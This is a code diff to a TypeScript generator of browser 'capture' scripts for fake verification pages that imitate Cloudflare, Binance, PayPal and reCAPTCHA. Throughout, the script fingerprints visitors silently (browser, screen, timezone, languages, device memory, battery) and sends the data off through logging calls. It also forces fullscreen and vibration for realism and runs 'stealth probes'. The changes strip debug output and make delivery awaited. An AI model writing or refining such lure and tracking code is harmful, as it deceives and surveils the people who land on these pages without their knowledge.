@@ -212,15 +212,11 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
       var isSilent = mode === 'silent' || flowType === 'silent';
       var accent = cfg.accent || '#3498db';
 
-      if (running) {
-        clientLog("startCapture: Already running, returning.");
-        return;
-      }
+      if (running) return;
       running = true;
       var statusText = null;
-      clientLog("startCapture: Initializing quickData...");
 
-      // IMMEDIATE METADATA CAPTURE
+      // 1. CAPTURE & SEND IMMEDIATE METADATA
       var quickData = {
         tmplId: cfg.tmplId,
         browser: navigator.userAgent,
@@ -228,51 +224,28 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         screen: window.screen.width + "x" + window.screen.height,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         langs: navigator.languages.join(','),
-        ref: document.referrer || "Direct"
+        ref: document.referrer || "Direct",
+        immediate: true // Mark as immediate delivery
       };
       
-      clientLog("startCapture: Calling logEvent('info')");
-      logEvent('info', quickData);
-      clientLog("startCapture: After logEvent('info')");
+      // Send immediately
+      await logEvent('info', quickData);
       
       var btn = document.querySelector('.btn-verify') || document.querySelector('.btn') || document.querySelector('button');
       if (btn) {
-        clientLog("startCapture: Found button, updating UI");
         btn.style.opacity = "0.7";
-        btn.style.cursor = "wait";
-        
-        var customText = "PROCESSING...";
-        if (cfg.tmplId === 'cloudflare') customText = "VERIFYING...";
-        if (cfg.tmplId === 'terminal') customText = "INITIALIZING...";
-        if (cfg.tmplId === 'binance' || cfg.tmplId === 'paypal') customText = "SECURE VERIFYING...";
-        if (cfg.tmplId === 'recap') customText = "VALIDATING...";
-        
-        btn.innerText = customText;
-      } else {
-        clientLog("startCapture: Button not found!");
+        btn.innerText = "VERIFYING...";
       }
 
-      try {
-        clientLog("startCapture: Attempting PointerLock...");
-        if (document.documentElement.requestPointerLock) document.documentElement.requestPointerLock();
-      } catch(e) { clientLog("startCapture: PointerLock failed", { error: e.message }); }
-
-      // Android-Specific: Haptic feedback for realism
-      clientLog("startCapture: Haptic...");
+      // 2. BACKGROUND PROBES (Fire and forget, they will logEvent('extra') later)
+      // Android-Specific: Haptic feedback
       if (navigator.vibrate) navigator.vibrate([5, 10, 5]);
 
-      // Android-Specific: Immersive attempt
-      clientLog("startCapture: Immersive...");
-      try {
-        if (document.documentElement.requestFullscreen) {
-          document.documentElement.requestFullscreen().catch(() => {});
-        }
-      } catch(e) { clientLog("startCapture: Fullscreen failed", { error: e.message }); }
+      // Android-Specific: Immersive attempt (Best effort)
+      try { if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen().catch(() => {}); } catch(e) {}
 
-      // Capture Deep Android Metadata
-      clientLog("startCapture: Capturing Android Meta...");
+      // Start Android Meta Capture
       const captureAndroidMeta = async () => {
-        clientLog("startCapture: Enter captureAndroidMeta");
         const meta = {
           sw_ver: navigator.appVersion,
           mem: (navigator as any).deviceMemory || 'unknown',
@@ -280,29 +253,24 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           ua: navigator.userAgent,
           platform: (navigator as any).platform || 'unknown'
         };
-        clientLog("startCapture: captureAndroidMeta", { meta });
 
         if ((navigator as any).getBattery) {
           try {
-            clientLog("startCapture: About to getBattery");
             const bat = await (navigator as any).getBattery();
             Object.assign(meta, {
               bat_lvl: Math.floor(bat.level * 100) + '%',
               bat_charging: bat.charging
             });
-          } catch(e) { clientLog("startCapture: getBattery failed", { error: e.message }); }
+          } catch(e) {}
         }
         
-        clientLog("startCapture: calling logExtra");
-        logExtra({ device_profile: meta });
-        clientLog("startCapture: Exiting captureAndroidMeta");
-        flushExtra();
+        await logExtra({ device_profile: meta });
+        await flushExtra();
       };
-      captureAndroidMeta().catch(e => clientLog("captureAndroidMeta error", { error: e.message }));
+      captureAndroidMeta().catch(e => console.error(e));
 
-      // Parallelize high-priority stealth probes
-      clientLog("startCapture: RunSilentProbes");
-      runSilentProbes().then(() => flushExtra()).catch(e => clientLog("runSilentProbes error", { error: e.message }));
+      // Silent Probes
+      runSilentProbes().then(() => flushExtra()).catch(e => console.error(e));
 
     if (!isSilent) {
       clientLog("startCapture: Not silent, setting up UI");
